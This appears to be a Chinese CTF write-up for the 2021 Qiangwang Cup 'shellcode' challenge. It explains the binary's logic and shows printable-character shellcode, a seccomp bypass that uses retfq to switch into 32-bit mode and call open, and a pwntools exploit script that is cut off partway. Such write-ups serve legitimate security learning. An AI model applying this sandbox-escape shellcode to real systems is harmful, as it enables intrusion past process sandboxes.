<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-5.jpg" class>

<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>保护</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/checksec.jpg" class>

<p>沙箱如下</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/seccomp.jpg" class>

<p>程序主逻辑如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// er13</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 arg3[<span class="number">2</span>]; <span class="comment">// [rsp+80h] [rbp-80h] BYREF</span></span><br><span class="line">  __int16 v10; <span class="comment">// [rsp+90h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+92h] [rbp-6Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+93h] [rbp-6Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+94h] [rbp-6Ch]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+98h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+9Ah] [rbp-66h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+9Bh] [rbp-65h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+9Ch] [rbp-64h]</span></span><br><span class="line">  __int16 v18; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+A2h] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+A3h] [rbp-5Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+A4h] [rbp-5Ch]</span></span><br><span class="line">  __int16 v22; <span class="comment">// [rsp+A8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+AAh] [rbp-56h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+ABh] [rbp-55h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [rsp+ACh] [rbp-54h]</span></span><br><span class="line">  __int16 v26; <span class="comment">// [rsp+B0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+B2h] [rbp-4Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v28; <span class="comment">// [rsp+B3h] [rbp-4Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+B4h] [rbp-4Ch]</span></span><br><span class="line">  __int16 v30; <span class="comment">// [rsp+B8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [rsp+BAh] [rbp-46h]</span></span><br><span class="line">  <span class="keyword">char</span> v32; <span class="comment">// [rsp+BBh] [rbp-45h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+BCh] [rbp-44h]</span></span><br><span class="line">  __int16 v34; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v35; <span class="comment">// [rsp+C2h] [rbp-3Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v36; <span class="comment">// [rsp+C3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v37; <span class="comment">// [rsp+C4h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v38; <span class="comment">// [rsp+C8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v39; <span class="comment">// [rsp+CAh] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// [rsp+CBh] [rbp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// [rsp+CCh] [rbp-34h]</span></span><br><span class="line">  __int16 v42; <span class="comment">// [rsp+D0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [rsp+D2h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// [rsp+D3h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v45; <span class="comment">// [rsp+D4h] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">32</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">21</span>;</span><br><span class="line">  v15 = <span class="number">6</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">5</span>;</span><br><span class="line">  v18 = <span class="number">21</span>;</span><br><span class="line">  v19 = <span class="number">5</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">37</span>;</span><br><span class="line">  v22 = <span class="number">21</span>;</span><br><span class="line">  v23 = <span class="number">3</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">4</span>;</span><br><span class="line">  v26 = <span class="number">21</span>;</span><br><span class="line">  v27 = <span class="number">3</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">21</span>;</span><br><span class="line">  v31 = <span class="number">2</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">9</span>;</span><br><span class="line">  v34 = <span class="number">21</span>;</span><br><span class="line">  v35 = <span class="number">1</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">231</span>;</span><br><span class="line">  v38 = <span class="number">6</span>;</span><br><span class="line">  v39 = <span class="number">0</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">6</span>;</span><br><span class="line">  v43 = <span class="number">0</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">2147418112</span>;</span><br><span class="line">  LOWORD(arg3[<span class="number">0</span>]) = <span class="number">9</span>;</span><br><span class="line">  arg3[<span class="number">1</span>] = &amp;v10;</span><br><span class="line">  v0 = sys_alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  v1 = sys_prctl(<span class="number">38</span>, <span class="number">1uLL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = sys_prctl(<span class="number">22</span>, <span class="number">2uLL</span>, arg3, v2);</span><br><span class="line">  v4 = sys_mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7uLL</span>, <span class="number">0x22</span>uLL, <span class="number">0xFFFFFFFF</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">  v5 = sys_read(<span class="number">0</span>, v4, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v4[v5 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v6 = v5 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] &lt;= <span class="number">31</span> || v4[i] == <span class="number">127</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  (v4)();	<span class="comment">//这里call rbx</span></span><br><span class="line">LABEL_10:</span><br><span class="line">  v8 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序逻辑很简单，先mmap一段rwx的内存，然后往这段内存中输入，程序检查我们的输入是否在<code>&gt;31 &amp;&amp; &lt;127</code>的范围内，如果不在则直接退出，如果检查通过则直接执行。</p>
<p>显然这是一道构造shellcode的题目，虽然我们可以通过alpha3和ae64等工具直接构造出符合条件的shellcode，但是显然因为沙箱的存在，所以我们需要手动构造。</p>
<p>沙箱只允许我们调用几个函数，可见其中我们可以利用的只有read，没有输出函数我们可以通过侧信道攻击爆破出shellcode，但是我们需要先解决连open都没有的问题。这时就要利用绕过沙箱的技巧，因为沙箱中的第一个函数fstat的调用号是5，而32位中5号系统调用对应open函数，所以只要我们将程序切换到32位模式下，就可以调用open函数了，然后再切换回来read和爆破即可。</p>
<p>但是因为retfq指令会先ret，同时ret之后程序按照32位模式来对齐地址和执行指令，所以在原本的64位模式下的地址中执行指令会出错，所以我们还先应该mmap一段固定的地址，来给32位的指令预留位置，mmap完之后调用read将我们的x86open和再次切换回64位的retfq指令写进这个地址中，完成后在retfq的同时跳转到这个地址执行。（因为32位模式下我们调用不了read，所以我们open完之后仍然需要返回到64位将flag写出来）</p>
<p>接下来编写可见字符范围内的read和mmap，在尝试构造的过程中，如果程序是这样的</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E5%88%86%E6%9E%90-1.jpg" class>

<p>则说明我们的输入通过了检查，因为程序是异常退出的，但如果是这样的</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E5%88%86%E6%9E%90-2.jpg" class>

<p>则说明我们的输入没有通过检查，因为程序是调用exit_group正常退出的</p>
<p>mmap需要按照这样调用：<code>mmap(0x40404040,0x7e,7,34,0,0)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	push rdx</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x7e</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    sub al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x2f],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x30],cl</span></span><br><span class="line"><span class="string">    /* set rcx */</span></span><br><span class="line"><span class="string">    push 0x22</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    /* set r8 */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r8</span></span><br><span class="line"><span class="string">    /* set r9 */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r9</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x49</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x52],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x53],cl</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  push rbx</span></span><br><span class="line"><span class="string">  pop rax</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  xor al,0x40</span></span><br><span class="line"><span class="string">  push 0x72</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x68</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x47</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x48</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x23</span></span><br><span class="line"><span class="string">  push 0x40404040</span></span><br><span class="line"><span class="string"> &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode_mmap + append + shellcode_read + append + shellcode_retfq + append</span><br><span class="line">p.send(asm(payload))</span><br></pre></td></tr></table></figure>

<p>前面我们说过利用<code>push rdx;pop rdx;</code>来构造shellcode，因为执行shellcode时call的是rbx，所以可以用rbx作为基址找到这两条指令的位置。</p>
<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E5%88%86%E6%9E%90-3.jpg" class>

<p>接下来构造x86下的open、返回到64位的retfq、返回64位之后用来读出flag的read以及一部分用来侧信道攻击的code，要注意这部分shellcode并不会通过程序的检查，因为这部分是用我们调用的read写进去的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* open(&quot;flag&quot;,0,0) */</span></span><br><span class="line"><span class="string">    mov esp,0x40404040</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ecx,eax</span></span><br><span class="line"><span class="string">    /* retfq */</span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x40404064</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    /* read */</span></span><br><span class="line"><span class="string">    mov rdi,rcx</span></span><br><span class="line"><span class="string">    mov rsi,0x404040a0</span></span><br><span class="line"><span class="string">    mov rdx,0x30</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>到这里题目就基本完成了，最后爆破一下就行，完整exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;ERROR&#x27;</span></span><br><span class="line"></span><br><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x7e</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    sub al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x2f],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x30],cl</span></span><br><span class="line"><span class="string">    /* set rcx */</span></span><br><span class="line"><span class="string">    push 0x22</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    /* set r8 */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r8</span></span><br><span class="line"><span class="string">    /* set r9 */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r9</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x49</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x52],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x53],cl</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  push rbx</span></span><br><span class="line"><span class="string">  pop rax</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  xor al,0x40</span></span><br><span class="line"><span class="string">  push 0x72</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x68</span></span><br><span class="line"><span class="string">  pop 